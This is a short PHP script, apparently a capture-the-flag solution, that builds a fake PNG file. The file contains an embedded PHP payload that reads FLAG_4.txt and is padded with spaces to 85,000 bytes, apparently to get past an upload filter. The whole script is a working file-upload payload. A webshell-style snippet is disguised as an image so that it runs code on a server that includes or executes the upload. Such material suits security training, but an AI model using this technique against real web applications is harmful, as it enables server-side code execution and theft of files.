<?php
// File content
$content = "12345678<?php readfile('FLAG_4.txt') ?>";

// Target size
$targetSize = 85000;

// Calculate the current content size
$currentSize = strlen($content);

// If the current size is less than the target size
if ($currentSize < $targetSize) {
    // Add padding bytes until the target size is reached
    $fillSize = $targetSize - $currentSize;
    $fillContent = str_repeat(' ', $fillSize); // Padding with spaces

    // Write the padded content into the file (NORMAL AD İLƏ)
    file_put_contents('image4_temp.png', $content . $fillContent);
    echo "File created: image4_temp.png\n";
    echo "File size: " . filesize('image4_temp.png') . " bytes\n";
} else {
    // If the current size is already greater than or equal to the target size, do nothing
    echo "File already meets size requirement\n";
}
?>
